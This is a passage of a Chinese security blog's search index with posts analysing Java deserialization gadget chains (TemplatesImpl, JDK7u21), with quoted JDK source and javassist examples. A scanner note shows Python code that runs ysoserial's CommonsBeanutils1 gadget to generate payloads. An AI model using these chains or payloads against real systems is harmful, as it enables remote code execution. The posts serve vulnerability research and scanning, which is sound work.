<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/posts/0.html"/>
      <url>/posts/0.html</url>
      
        <content type="html"><![CDATA[        <h1 id="安卓内核编译"   >          <a href="#安卓内核编译" class="heading-link"><i class="fas fa-link"></i></a><a href="#安卓内核编译" class="headerlink" title="安卓内核编译"></a>安卓内核编译</h1>      <p>折腾半天可算是成功能编译出内核了，踩的坑是真的多，下面来分享一下</p><p>首先就是在正常情况下大部分人的电脑都是x86架构的，但是移动设备基本都是ARM架构，所以我们不能直接在平常的环境下去直接make然后编译出内核使用，我们需要用一个角</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/0.html"/>
      <url>/posts/0.html</url>
      
        <content type="html"><![CDATA[        <h2 id="针对需要yso序列化数据的"   >          <a href="#针对需要yso序列化数据的" class="heading-link"><i class="fas fa-link"></i></a><a href="#针对需要yso序列化数据的" class="headerlink" title="针对需要yso序列化数据的"></a>针对需要yso序列化数据的</h2>      <p>目前是通过执行 ysoserial.jar 去生成的，文件名保持一致即可。用法参考这个，注意下ysoserial.jar的目录，是父路径下的tools目录 </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">tools_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'tools/'</span><span class="token punctuation">)</span>obj <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'java'</span><span class="token punctuation">,</span> <span class="token string">'-jar'</span><span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>tools_path<span class="token punctuation">&#125;</span></span><span class="token string">ysoserial.jar'</span></span><span class="token punctuation">,</span> <span class="token string">'CommonsBeanutils1'</span><span class="token punctuation">,</span> param<span class="token punctuation">]</span><span class="token punctuation">,</span>stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span>payload<span class="token punctuation">,</span> err <span class="token operator">=</span> obj<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>    logger<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string">"请把附件里名为ysoserial.jar放入父路径下的tools目录中"</span><span class="token punctuation">)</span>    exit<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>post_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h2 id="对于组件漏洞的指纹"   >          <a href="#对于组件漏洞的指纹" class="heading-link"><i class="fas fa-link"></i></a><a href="#对于组件漏洞的指纹" class="headerlink" title="对于组件漏洞的指纹"></a>对于组件漏洞的指纹</h2>      <p>目前的措施是：</p><ol><li>其他漏洞全部扫描完成后，结合爬虫的路径，对能够命中指纹的路径进行扫描；</li><li>poc中的指纹，不仅仅包含这个组件的指纹，也包含可能会使用到这个组件的应用、框架指纹，这样提高扫描覆盖面</li></ol>        <h2 id="对于指纹编写方式"   >          <a href="#对于指纹编写方式" class="heading-link"><i class="fas fa-link"></i></a><a href="#对于指纹编写方式" class="headerlink" title="对于指纹编写方式"></a>对于指纹编写方式</h2>      <pre class="line-numbers language-none"><code class="language-none">&#123;  &quot;name&quot;: &quot;应用名称&quot;,  &quot;author&quot;: &quot;360漏洞云&quot;,  &quot;version&quot;: &quot;&quot;,  &quot;description&quot;: &quot;漏洞描述&quot;,  &quot;homepage&quot;: &quot;应用网站&quot;,  &quot;categories&quot;: [],  &quot;path&quot;: [&quot;&quot;],&#x2F;&#x2F;基础路径，可为空  &quot;rules&quot;: [    &#123;      &quot;conditions&quot;: [        &#123;          &quot;search&quot;: &quot;headers&quot;,&#x2F;&#x2F;此处可选择对响应头headers和响应体body进行匹配          &quot;text&quot;: &quot;php&quot;        &#125;，        &#123;          &quot;path&quot;: &quot;静态文件url路径&quot;,          &quot;md5&quot;: [&quot;静态文件md5哈希值&quot;]        &#125;      ]    &#125;  ]&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>TemplatesImpl在反序列化链中的作用</title>
      <link href="/posts/43ed0f37.html"/>
      <url>/posts/43ed0f37.html</url>
      
        <content type="html"><![CDATA[        <h2 id="起因"   >          <a href="#起因" class="heading-link"><i class="fas fa-link"></i></a><a href="#起因" class="headerlink" title="起因"></a>起因</h2>      <p>TemplatesImpl这个东西经常在java反序列化加载恶意类的时候见到，还是要详细看一下执行流程</p>        <h2 id="通过ClassLoader加载字节码"   >          <a href="#通过ClassLoader加载字节码" class="heading-link"><i class="fas fa-link"></i></a><a href="#通过ClassLoader加载字节码" class="headerlink" title="通过ClassLoader加载字节码"></a>通过ClassLoader加载字节码</h2>      <p>我们都知道Java中ClassLoader是用来加载字节码文件最基础的方法，可以将Java的字节码转为Java虚拟机中的类</p><p>但是在正常情况下，由于defineClass是一个protected方法，我们调用它去加载也只能通过反射调用，所以实际反序列化利用的时候直接利用并不现实（毕竟反序列化并不能直接进行反射操作）</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202302061229900.png"></p><p>那么这时有人发现TemplatesImpl重写了defineClass方法，并且这个类并没有定义作用域，在Java中相当于定义作用域为default，那么这里的defineClass方法就从父类的protected方法变成了default方法</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202302061233295.png"></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202302061234214.png"></p><p>这时候我们就可以从外部调用defineClass方法了（它甚至自动帮你写length，我哭死）</p><p>不过此时的defineClass依然定义在TransletClassLoader中，只能被类内的方法调用，所以我们需要找到使用了TransletClassLoader的类</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202302061248195.png"></p><pre class="line-numbers language-none"><code class="language-none">private synchronized Class[] getTransletClasses()要求_class为nullprivate Translet getTransletInstance()要求_class为null且_name不为nullpublic synchronized int getTransletIndex()要求_class为null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>俩私有一个公有，是我我肯定选公有那个，但是公有的直接调用会因为不明原因并没有进行加载（感觉是<strong>synchronized</strong>的原因），所以我们只能继续向上找</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202302061530912.png"></p><p>找到newTransformer，在执行<code>transformer = new TransformerImpl(getTransletInstance(),_outputProperties,_indentNumber, _tfactory);</code>时会执行<code>getTransletInstance</code>进而执行</p><p>最后能找到的两条链子是</p><pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">（<span class="token function">getOutputProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span>->）<span class="token function">newTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span>-><span class="token function">getTransletInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span>-><span class="token function">defineTransletClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对属性的要求是</p><pre class="line-numbers language-none"><code class="language-none">_bytecodes被赋值为我们定义的恶意类的字节码，该类需要继承com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet，这个部分不继承抛出一次error你就知道了_class必须为null_name必须不为null_tfactory必须是TransformerFactoryImpl实例<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>最后关于为什么上面的public不能直接用的原因，是因为其中defineClass是不会自动执行构造方法的，甚至静态代码块也是不会执行的，所以我们实际上不仅需要执行defineClass，还需要进行newInstance操作对类进行实例化（无参），可以看到三个方法中只有getTransletInstance进行了newInstance操作，这里也再次重申了需要进行继承AbstractTranslet</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202302061654421.png"></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>JDK7u21反序列化分析</title>
      <link href="/posts/5cd8cac3.html"/>
      <url>/posts/5cd8cac3.html</url>
      
        <content type="html"><![CDATA[<p>其实一开始就应该先跟这个的QAQ</p>        <h2 id="前置知识"   >          <a href="#前置知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2>      <p>首先是java中提供了一个可以直接对java字节码进行操作的库<strong>javassist</strong></p>        <h3 id="javassist"   >          <a href="#javassist" class="heading-link"><i class="fas fa-link"></i></a><a href="#javassist" class="headerlink" title="javassist"></a>javassist</h3>      <blockquote><p><span class="exturl"><a class="exturl__link"   href="https://github.com/jboss-javassist/javassist" >javassist</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>: Java字节码操作库，提供了在运行时操作Java字节码的方法，如在已有 Class 中动态修改和插入Java代码，示例：在 Cat 类中添加包含恶意代码的 static block</p><pre class="line-numbers language-none"><code class="language-none">public class Cat &#123;&#125;@Testpublic void test() throws Exception &#123;  ClassPool pool &#x3D; ClassPool.getDefault();  CtClass cc &#x3D; pool.get(Cat.class.getName());  String cmd &#x3D; &quot;System.out.println(\&quot;evil code\&quot;);&quot;;  &#x2F;&#x2F; 创建 static 代码块，并插入代码  cc.makeClassInitializer().insertBefore(cmd);  String randomClassName &#x3D; &quot;EvilCat&quot; + System.nanoTime();  cc.setName(randomClassName);  &#x2F;&#x2F; 写入.class 文件  cc.writeFile();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成的 .class，反编译后的源码如下：</p><pre class="line-numbers language-none"><code class="language-none">public class EvilCat1522165524449145000 &#123;    public EvilCat1522165524449145000() &#123;    &#125;    static &#123;        System.out.println(&quot;evil code&quot;);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>除了 static block，也可以在 constructor 或其他方法中添加代码。 关于 javassist 的详细介绍可以参考 <span class="exturl"><a class="exturl__link"   href="http://www.cnblogs.com/hucn/p/3636912.html" >http://www.cnblogs.com/hucn/p/3636912.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>在 Jdk7u21 的 payload 中，使用了 javassist 来构造包含恶意代码的class</p></blockquote><p>然后就是Java类中的静态代码，在类初始化时会被调用，也就是说对只要对类进行了加载操作这部分的代码就会被执行</p><blockquote>        <h2 id="Java-static-initializer"   >          <a href="#Java-static-initializer" class="heading-link"><i class="fas fa-link"></i></a><a href="#Java-static-initializer" class="headerlink" title="Java static initializer"></a>Java static initializer</h2>      <p>Java Class 中定义的 static 代码块被称为 <span class="exturl"><a class="exturl__link"   href="http://docs.oracle.com/javase/specs/jls/se7/html/jls-8.html#jls-8.7" >static initializer</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，在 class 初始化 (initialized) 时会执行该语句块</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">public class StaticInitializerTest &#123;    static &#123;        System.out.println(&quot;static initializer&quot;);    &#125;      public StaticInitializerTest() &#123;        System.out.println(&quot;constructor executed&quot;);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于 “class 初始化”，听起来比较抽象，这里通过代码来说明一下：</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">@Testpublic void testStaticBlock() throws Exception &#123;    &#x2F;&#x2F; 内部调用 loadClass(name, false) 不会 initialize class，无 print    JavassistTests.class.getClassLoader().loadClass(&quot;com.b1ngz.jdk7u21.StaticInitializerTest&quot;);    &#x2F;&#x2F; 反射加载，会 initialize class，print static initializer    Class.forName(&quot;com.b1ngz.jdk7u21.StaticInitializerTest&quot;);    &#x2F;&#x2F; 实例化，先打印 static initializer，再打印 constructor executed    Assert.assertNotNull(StaticInitializerTest.class.newInstance());    &#x2F;&#x2F; 实例化，先打印 static initializer，再打印 constructor executed    Assert.assertNotNull(new StaticInitializerTest());&#125;@Testpublic void testDefineClass() throws Exception &#123;    ClassPool pool &#x3D; ClassPool.getDefault();    CtClass cc &#x3D; pool.get(StaticInitializerTest.class.getName());    &#x2F;&#x2F; avoid duplicate class definition    String randomClassName &#x3D; &quot;EvilCat&quot; + System.nanoTime();    cc.setName(randomClassName);    byte[] byteCodes &#x3D; cc.toBytecode();    &#x2F;&#x2F; protected method, use reflect    Method method &#x3D; ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class);    method.setAccessible(true);    &#x2F;&#x2F; 不会 initialize class，无 print    method.invoke(JavassistTests.class.getClassLoader(), new Object[]&#123;(String) null, byteCodes, 0, byteCodes.length&#125;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里需要重点关注一下 <code>ClassLoader.defineClass()</code> 方法运行后，<strong>并不会执行 static block</strong>，而 <code>Class.newInstance()</code> 会执行，这两个地方会涉及到 Jdk7u21 payload 恶意代码的具体执行点</p><p>关于 <code>Class.forName(&quot;SomeClass&quot;);</code> 和 <code>ClassLoader.loadClass(&quot;SomeClass&quot;);</code> ，有兴趣的可以参考 <span class="exturl"><a class="exturl__link"   href="https://stackoverflow.com/a/8100407/6467552" >https://stackoverflow.com/a/8100407/6467552</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p></blockquote><p>动态代理，简单带过吧，就是对接口实现代理，主要要用的就是这个接口<strong>InvocationHandler</strong>，使用时被代理的对象的所有方法与参数会分别作为method和args参数传入到invoke方法中，后面你想怎么操作就是你的事情啦</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">public interface InvocationHandler &#123;    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable;&#125;基础实现如下public static class MyInvocationHandler implements InvocationHandler&#123;    private Map map;    &#x2F;&#x2F;记得将被代理的东西放进来，不然你怎么调用（）    public MyInvocationHandler(Map map) &#123;        this.map &#x3D; map;    &#125;    &#x2F;&#x2F; 实际的方法调用都会变成调用 invoke 方法    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;        System.out.println(&quot;method: &quot; + method.getName() + &quot; start&quot;);        Object result &#x3D; method.invoke(map, args);        System.out.println(&quot;method: &quot; + method.getName() + &quot; finish&quot;);        return result;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h2 id="TemplatesImpl"   >          <a href="#TemplatesImpl" class="heading-link"><i class="fas fa-link"></i></a><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2>      <p>常用的字节码加载类，总结可以看另一篇，调用到newTransformer或者getOutputProperties方法即可</p><p>好啦，前置知识都写完了，下面开始走链子吧</p>        <h2 id="调用链"   >          <a href="#调用链" class="heading-link"><i class="fas fa-link"></i></a><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h2>      <pre class="line-numbers language-none"><code class="language-none">LinkedHashSet.readObject()  LinkedHashSet.add()    ...      TemplatesImpl.hashCode() (X)  LinkedHashSet.add()    ...      Proxy(Templates).hashCode() (X)        AnnotationInvocationHandler.invoke() (X)          AnnotationInvocationHandler.hashCodeImpl() (X)            String.hashCode() (0)            AnnotationInvocationHandler.memberValueHashCode() (X)              TemplatesImpl.hashCode() (X)      Proxy(Templates).equals()        AnnotationInvocationHandler.invoke()          AnnotationInvocationHandler.equalsImpl()            Method.invoke()              ...                TemplatesImpl.getOutputProperties()                  TemplatesImpl.newTransformer()                    TemplatesImpl.getTransletInstance()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">for(Iterator var2 &#x3D; this.memberValues.entrySet().iterator(); var2.hasNext(); var1 +&#x3D; 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) &#123;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202302222057205.png"></p><p>当为某个类或接口指定<code>InvocationHandler</code>对象时，在调用该类或接口方法时，就会去调用指定<code>handler</code>的<code>invoke()</code>方法，而<code>AnnotationInvocationHandler</code>就重写了invoke方法</p><pre class="line-numbers language-none"><code class="language-none">public Object invoke(Object var1, Method var2, Object[] var3) &#123;    String var4 &#x3D; var2.getName();    Class[] var5 &#x3D; var2.getParameterTypes();    if (var4.equals(&quot;equals&quot;) &amp;&amp; var5.length &#x3D;&#x3D; 1 &amp;&amp; var5[0] &#x3D;&#x3D; Object.class) &#123;        return this.equalsImpl(var3[0]);    &#125; else <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>并且对equals进行了单独处理，在满足条件时会调用equalsImpl，在满足传入对象不等于this，并且this是传入对象的子类的情况下，会依次调用传入对象的所有方法和this进行比较</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token class-name">Boolean</span> <span class="token function">equalsImpl</span><span class="token punctuation">(</span><span class="token class-name">Object</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>var1 <span class="token operator">==</span> <span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>type<span class="token punctuation">.</span><span class="token function">isInstance</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Method</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var2 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getMemberMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> var3 <span class="token operator">=</span> var2<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> var4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> var4 <span class="token operator">&lt;</span> var3<span class="token punctuation">;</span> <span class="token operator">++</span>var4<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Method</span> var5 <span class="token operator">=</span> var2<span class="token punctuation">[</span>var4<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> var6 <span class="token operator">=</span> var5<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Object</span> var7 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>memberValues<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>var6<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Object</span> var8 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token class-name">AnnotationInvocationHandler</span> var9 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">asOneOfUs</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>var9 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                var8 <span class="token operator">=</span> var9<span class="token punctuation">.</span>memberValues<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>var6<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    var8 <span class="token operator">=</span> var5<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InvocationTargetException</span> var11<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalAccessException</span> var12<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">AssertionError</span><span class="token punctuation">(</span>var12<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">memberValueEquals</span><span class="token punctuation">(</span>var7<span class="token punctuation">,</span> var8<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么下一步我们就要找在反序列化过程中调用了equals方法的地方了，找到了LinkedHashSet</p><p>在LinkedHashSet的readObject中会依次对其中的对象进行反序列化，并且通过put操作将其放到Set中</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">V</span> <span class="token function">put</span><span class="token punctuation">(</span><span class="token class-name">K</span> key<span class="token punctuation">,</span> <span class="token class-name">V</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token function">putForNullKey</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> hash <span class="token operator">=</span> <span class="token function">hash</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token function">indexFor</span><span class="token punctuation">(</span>hash<span class="token punctuation">,</span> table<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">,</span><span class="token class-name">V</span><span class="token punctuation">></span></span> e <span class="token operator">=</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> e <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">;</span> e <span class="token operator">=</span> e<span class="token punctuation">.</span>next<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Object</span> k<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>hash <span class="token operator">==</span> hash <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>k <span class="token operator">=</span> e<span class="token punctuation">.</span>key<span class="token punctuation">)</span> <span class="token operator">==</span> key <span class="token operator">||</span> key<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">V</span> oldValue <span class="token operator">=</span> e<span class="token punctuation">.</span>value<span class="token punctuation">;</span>            e<span class="token punctuation">.</span>value <span class="token operator">=</span> value<span class="token punctuation">;</span>            e<span class="token punctuation">.</span><span class="token function">recordAccess</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> oldValue<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    modCount<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token function">addEntry</span><span class="token punctuation">(</span>hash<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到在其中会对传入的对象进行依次比较，如果通过了key相同的比较那么就会替换的方式完成新数据的插入</p><p>在java中set实际上是通过继承map实现的，并且key就是set中某项的值，所以这里实际上就是set的比较</p><p>这里e.hash == hash并且k!=e.key的情况下才能继续走到我们的equals中</p><p>k!=e.key明显是可以的，在我们预想构建的内容中key应该是一个<code>AnnotationInvocationHandler</code>类型而k则是<code>TemplatesImpl</code>，所以二者必然是不相等的</p><p>e.hash == hash(key)的条件要如何满足呢，TemplatesImpl并没有重写hashCode，所以直接就是默认的hash，而在AnnotationInvocationHandler中对hashCode进行了重写</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">int</span> <span class="token function">hashCodeImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> var1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token class-name">Map<span class="token punctuation">.</span>Entry</span> var3<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Iterator</span> var2 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>memberValues<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> var2<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> var1 <span class="token operator">+=</span> <span class="token number">127</span> <span 